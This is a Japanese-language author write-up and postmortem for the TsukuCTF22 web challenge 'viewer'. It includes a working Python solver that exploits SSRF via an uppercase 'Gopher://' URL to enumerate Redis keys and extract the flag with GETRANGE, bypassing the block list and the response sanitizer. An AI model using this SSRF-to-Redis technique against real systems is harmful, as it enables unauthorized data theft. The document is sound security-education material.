---
title: viewer
description: Writeups for TsukuCTF21 have been published. Check them out if you'd like!
author: task4233
genre: Web
solver: 8
point: 500
---

# viewer
## はじめに
本問題で配布されたコードの一部に実装不備があり参加者体験を悪くしてしまったことを、CTF終了後に幾つかのブログ記事やツイートから知りました。この件に関して、万全の問題提供ができなかったことをお詫び申し上げます。

再発防止のために配布されるコードと本番環境のコードに差異を生まないようレビュー段階で注意する予定です。そして、参加者の皆様にとってより良いCTFにするためにも、不審な点などがあればDiscordの#ask-to-adminでご確認いただけると非常にありがたいです。よろしくお願いします。

また、これに伴い簡単なポストモーテムを行ったためWriteup末尾に追記します。本件に興味がある方はご覧ください。

## 問題文
Writeups for TsukuCTF21 have been published.
Check them out if you'd like!


## 難易度
Medium

## 解法
配布されているソースコードを読むと、redisの中にFLAGが含まれていることが分かる。  
curlでredisということは別プロトコルを利用したSSRFが思い浮かぶ。  
Flagが存在している場所は`app.py` 上かredis内部であるため、いずれかの情報を抜き取りたい。  
前者は `file://` scheme、後者は `gopher://` や`dict://` schemeを利用することになりそうだ。

しかし、前者は以下の `response_sanitizer` によってサニタイズされるため、後者を利用することにする。

```python
# app.py
# a response is also sanitized just in case because the flag is super sensitive information.
blacklist_in_response = ['TsukuCTF22']

def response_sanitizer(body: str) -> str:
    if any([scheme in body for scheme in blacklist_in_response]):
        return "SANITIZED: a sensitive data is included!"
    return body
```

`gopher://` 等は禁止されているように見えるが、case-insensitiveなので大文字を含めることで回避できる。

ただし、gopherで対象のvalueを取るために、redisのkeyを知る必要がある。  
keyはredisの `keys *` で全列挙できるため、全てのkeyを列挙してresponseにflagが含まれるものを選択すれば良い。

また、`TsukuCTF22`という文字列を含む場合はサニタイズされるが、`GETRANGE` で一部を抜き出すことで対処できる。  
したがって、方針は以下の通りになる。  
まず、redisに含まれるkeyを全列挙し、次にGETRANGEで列挙したものの一部を読み取る。  

solverは以下の通り。

```python
import requests
from urllib.parse import quote
import re
import sys

# CHANGE HERE with an appropriate url
TARGET_URL = "http://127.0.0.1:31555"

# enumerate redis keys
form = {
    "url": "Gopher://redis:6379/+" + quote("keys *\r\nQUIT\r\n")
}
cookies = {
    "__SESSION_ID": "d8c7d141-b8da-416b-a220-d8d7218c8bbc", # dummy session id
}
res = requests.post(TARGET_URL, data=form, cookies=cookies)

session_id_list = re.findall("(.+-.+-.+-.+-.+)\r", res.text)
# print(session_id_list)

# check redis value
for session_id in session_id_list:
    form["url"] = "Gopher://redis:6379/+" + quote(f"GETRANGE {session_id} 60 -1\r\nQUIT\r\n")
    cookies["__SESSION_ID"] = session_id
    res = requests.post(TARGET_URL, data=form, cookies=cookies)
    if "CTF22{" in res.text:
        print("TsukuCTF22{" + res.text[res.text.find("CTF22{") + len("CTF22{"):res.text.find("}&#34;")] + "}")
        sys.exit(0)

```

上記のソルバを実行すると、以下のFlagが得られる。

```
TsukuCTF22{ur1_scheme_1s_u5efu1}
```

## ポストモーテム
### 何が起こったか
前提として、実装コードに不備があったために、問題にアクセスする時にCookieに格納される `__SESSION_ID` が共有されているという問題がありました。

本来であればこの問題によりFlagが取得できないはずです。しかし、配布されたコードと本番環境のコードのFlagをRedisに追加する部分に差異があったために、配布されたコードで構築できる環境によってはFlagが取得できないにも拘らず、本番環境ではFlagが取得できるという現象が起きました。

実際に本番中はソルバによってFlagが取得できることのみを確認していたため、この問題に気づけませんでした。

### 技術的詳細
コードを用いて具体的に説明します。

まず、以下が配布されたコードでFlagをRedisに追加する部分のコードです。

```python
# initialization
redis = redis.Redis(host='redis', port=6379, db=0)
flag = "TsukuCTF22{dummy flag}" # the flag is replaced a real flag in a production environment.
id = str(uuid.uuid4())
redis.set(id, json.dumps({"id": id, "name": flag}))
```

これにより、UUIDv4をIDとしたFlagを含むデータがRedisに登録されます。

しかし、アカウント登録の部分にて以下の通りそのIDに対して上書きが行われます。

```python
    redis.set(id, json.dumps({"id": str(uuid.uuid4()), "name": name}))
    redis.expire(id, 100)
```

その結果、Redisに登録されたFlagが名前で上書きされてしまいます。

詳しくは[mopiさんのブログ](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)にて検証されているためご覧ください。検証までブログに掲載してくださったmopiさん、ありがとうございました🙏

---

一方、以下が本番環境のコードでFlagをRedisに追加する部分のコードです。

```python
# user session information
redis = redis.Redis(host='redis', port=6379, db=0)
users = ['frt', 'ny_a', 'satoki', 'shio', 'taisyo', 'task', "TsukuCTF22{ur1_scheme_1s_u5efu1}", 'toto', 'xryuseix', 'y-chan', 'yu1k', 'yoshimi', 'ling', 'momoka', 'taru', 'imino']
for user in users:
    id = str(uuid.uuid4())
    redis.set(id, json.dumps({"id": id, "name": user}))
```

`id` はループでイテレートされているため、`id`が変更されるのは最後のユーザのみになります。そのため、本番環境ではFlagの上書きが発生しませんでした。

### 根本原因
**根本原因はユーザ登録を行うid用のUUIDv4を再生成していなかったこと** にあります。その影響で、配布されたコードで構築される環境では、Redisに追加されたFlagが上書きされてしまい取得することが不可能になります。

しかし、上記の通り、**本番環境ではRedisにダミーデータを含めてFlagを挿入していたために、Flagが上書きされずに取得できていました**。この差異は作問時から含まれていましたが、作問時には作問方針と解法の流れのみがレビューされていたために、この問題に気づけませんでした。

また、本番中は約1時間ごとに1回ソルバを回してFlagが得られることのみを確認していたために、配布ファイルには気を配れていませんでした。

### 解決
以下の通り `id` を生成してから登録することで、正しい実装になります。

```python
    id = uuid.uuid4()
    redis.set(id, json.dumps({"id": str(id), "name": name}))
    redis.expire(id, 100)
```

### 影響
影響を受けたユーザは全ユーザです。一応、本件に関して言及してくださったブログやツイートを載せておきます。

- [TsukuCTF 2022 Writeup](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)
- [ツイート1](https://twitter.com/zeosutt/status/1584214650853683200)
- [ツイート2](https://twitter.com/shinobe179/status/1584574685718585344)


### 対応者
問題が発覚したのはCTF終了後だったため、本番中の対応者はいません。

### 追記
実装に関して、他にも修正すべき点がいくつかあったので以下に記載しておきます。

**Exceptionが起きた時にPycURLのコネクションがcloseされない**

配布ファイルは以下のようになっており、PycURLで `c.perform()` 実行時にExceptionが発生した場合は `c.close()` が呼ばれません。

```python
        buf = BytesIO()
        try:
            c = pycurl.Curl()
            c.setopt(c.URL, url)
            c.setopt(c.WRITEDATA, buf)
            c.perform()
            c.close()
    
            body = buf.getvalue().decode('utf-8')
        except Exception as e:
            traceback.print_exc()
            abort("error occurs")
```

したがって、以下の通り `finally` 句を利用するべきです。

```python
        buf = BytesIO()
        c = None
        try:
            c = pycurl.Curl()
            c.setopt(c.URL, url)
            c.setopt(c.WRITEDATA, buf)
            c.perform()
    
            body = buf.getvalue().decode('utf-8')
        except Exception as e:
            traceback.print_exc()
            abort("error occurs")
        finally:
            c.close()
```

**PycURLのタイムアウトが設けられていない**

PycURLはデフォルトで300[s]のコネクションタイムアウトを持っていますが、今回のアプリケーションの要件には長すぎです。今回の問題では得られたRedisのkeyに対して全探索を行う必要があり、コネクションが集中することは容易に想定できるため、タイムアウトは10[s]くらいに設定しておいても良かったのではないかと思いました。

### おわりに
この度は、作問者の実装不備によって、参加者体験を悪くしてしまったことを深くお詫び申し上げます。
今後はレビュー時に解法の方針やフラグチェック用のソルバだけでなく、配布ファイルにも気を配ってレビューする予定です。

また、他の参加者も含めたより良いCTF体験のために、Discordでの#ask-to-adminにてお問い合わせいただくなどのご協力をお願いいたします。

## 参考資料
- [ポストモーテムテンプレート - PagerDuty](https://ueokande.github.io/incident-response-docs-ja/after/post_mortem_template/)
